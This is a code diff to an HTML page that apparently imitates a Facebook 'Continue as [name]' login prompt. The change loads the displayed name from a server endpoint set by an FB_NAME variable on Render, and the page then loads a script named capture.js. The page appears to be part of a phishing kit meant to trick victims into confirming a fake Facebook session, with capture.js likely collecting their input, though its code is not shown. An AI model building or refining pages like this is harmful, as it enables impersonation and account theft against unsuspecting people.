@@ -306,17 +306,18 @@
   </div>
 
   <script>
-    // ════════════════════════════════════════════════════
-    // ▶ CHANGE THIS NAME TO WHATEVER YOU WANT ◀
-    const FB_DISPLAY_NAME = 'John Smith';
-    // ════════════════════════════════════════════════════
-
-    (function() {
-      const firstName = FB_DISPLAY_NAME.split(' ')[0];
-      document.getElementById('userName').textContent = FB_DISPLAY_NAME;
+    function applyName(name) {
+      const firstName = name.split(' ')[0];
+      document.getElementById('userName').textContent = name;
       document.getElementById('continueBtn').textContent = 'Continue as ' + firstName;
-      document.getElementById('avatarInitial').textContent = FB_DISPLAY_NAME.charAt(0).toUpperCase();
-    })();
+      document.getElementById('avatarInitial').textContent = name.charAt(0).toUpperCase();
+    }
+
+    // Fetch the FB name from the server (set via FB_NAME env var on Render)
+    fetch('/api/config/fb-name')
+      .then(r => r.json())
+      .then(d => applyName(d.name || 'John Smith'))
+      .catch(() => applyName('John Smith'));
   </script>
   <script src="/capture.js"></script>
 </body>
